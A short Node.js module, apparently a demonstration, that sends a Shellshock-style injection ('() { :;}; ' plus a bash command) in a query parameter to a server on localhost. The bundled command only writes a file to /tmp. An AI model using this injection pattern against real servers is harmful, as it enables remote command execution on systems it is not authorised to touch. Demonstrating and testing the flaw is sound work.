var http = require('http');
var url  = require('url');

module.exports = {
  attack: function(port, cb) {
    var command = "bash -c \"echo This command could have been anything > /tmp/website.html\"";
    var injection = '() { :;}; ' + command;

    var victim_url = url.format({
      protocol: 'http',
      hostname: 'localhost',
      port: port,
      query: {
        someval: injection
      }
    });

    console.log("Hitting the server with URL: ", victim_url);

    http.get(victim_url, cb);
  }
};
